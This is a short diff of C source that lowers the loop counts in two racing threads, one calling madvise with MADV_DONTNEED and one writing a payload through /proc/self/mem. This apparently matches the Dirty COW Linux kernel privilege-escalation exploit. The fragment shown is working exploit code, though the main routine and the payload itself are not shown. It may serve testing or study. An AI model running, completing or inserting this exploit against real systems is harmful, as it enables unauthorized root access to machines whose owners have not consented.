@@ -29,7 +29,7 @@ void *madviseThread(void *arg) {
     char *str;
     str = (char *)arg;
     int i, c = 0;
-    for(i = 0; i < 10000000; i++) {
+    for(i = 0; i < 100000; i++) {
         /* Advise the kernel that this memory area is no longer needed */
         c += madvise(map, 100, MADV_DONTNEED);
     }
@@ -50,7 +50,7 @@ void *procSelfMemThread(void *arg) {
     }
     
     int i;
-    for(i = 0; i < 10000000; i++) {
+    for(i = 0; i < 100000; i++) {
         /* Seek to the mapped memory offset in our address space */
         lseek(f, (uintptr_t)map, SEEK_SET);
         /* Attempt to write the payload */
